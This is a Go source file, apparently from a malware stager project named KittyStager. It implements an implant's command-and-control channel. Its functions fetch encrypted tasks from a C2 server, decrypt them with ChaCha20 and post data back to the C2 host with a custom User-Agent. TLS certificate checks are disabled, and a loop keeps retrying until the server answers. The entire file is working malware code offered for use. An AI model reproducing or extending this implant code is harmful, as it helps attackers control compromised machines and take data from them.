package malware

import (
	"KittyStager/internal/crypto"
	"KittyStager/internal/task"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"time"
)

func GetTask(config Config, key string) (task.Task, error) {
	t := task.NewTask("", nil)
	c := crypto.NewChaCha20()
	r, err := GetRequest(config)
	if err != nil {
		return task.Task{}, err
	}
	d, err := c.Decrypt(r, []byte(key))
	if err != nil {
		return task.Task{}, err
	}
	err = t.UnmarshallTask(d)
	if err != nil {
		return task.Task{}, err
	}
	return *t, nil
}

// GetRequest does a get request to the C2
func GetRequest(config Config) ([]byte, error) {
	var body []byte
	//for https
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	target := fmt.Sprintf("%s/%s/%s", config.Host, config.GetEndpoint, config.getName())
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return body, err
	}
	req.Header.Add("User-Agent", config.getUserAgent())
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}

// postRequest does a post request to the C2
func PostRequest(content []byte, endpoint string, config Config) ([]byte, error) {
	var body []byte
	//for https
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	target := fmt.Sprintf("%s/%s/%s", config.getHost(), endpoint, config.getName())
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, err := http.NewRequest("POST", target, bytes.NewBuffer(content))
	if err != nil {
		return body, err
	}
	req.Header.Add("User-Agent", config.getUserAgent())
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}

func CheckConnection(config Config) {
	for {
		_, err := GetRequest(config)
		if err == nil {
			return
		}
		fmt.Println("no connection")
		sleep(config)
	}
}
